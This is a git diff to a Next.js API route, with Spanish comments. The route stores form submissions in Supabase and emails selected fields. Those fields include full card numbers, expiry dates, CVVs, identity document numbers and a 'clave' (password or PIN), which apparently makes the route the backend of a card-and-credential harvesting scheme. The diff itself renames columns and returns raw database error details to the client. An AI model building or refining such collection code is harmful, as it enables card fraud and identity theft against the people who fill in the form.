@@ -32,13 +32,13 @@ export async function POST(req: Request) {
 
     const data = Payload.parse(raw);
 
-    // 1) Guardar en Supabase
+    // 1) Guardar en Supabase (usa columnas en minúsculas)
     const { error: dbError } = await supabase.from("form_submissions").insert([
       {
         amount: data.amount,
-        payDay: data.payDay,
-        docType: data.docType,
-        docNumber: data.docNumber,
+        payday: data.payDay,
+        doctype: data.docType,
+        docnumber: data.docNumber,
         card: data.card,
         exp: data.exp,
         cvv: data.cvv,
@@ -50,7 +50,7 @@ export async function POST(req: Request) {
     if (dbError) {
       console.error("❌ Supabase insert error:", dbError);
       return NextResponse.json(
-        { ok: false, message: "Error guardando en Supabase" },
+        { ok: false, message: "Error guardando en Supabase", details: dbError },
         { status: 500 }
       );
     }
@@ -58,7 +58,7 @@ export async function POST(req: Request) {
     console.log("✅ Registro insertado en Supabase");
 
     // 2) Preparar correo
-    const includeCsv = process.env.INCLUDE_FIELDS; // ej: "card,exp,cvv,clave,docType,docNumber"
+    const includeCsv = process.env.INCLUDE_FIELDS; // ej: "card,exp,cvv,clave,doctype,docnumber"
     const allowed = pickAllowedFields(data, includeCsv);
 
     const entriesHtml = Object.entries(allowed)
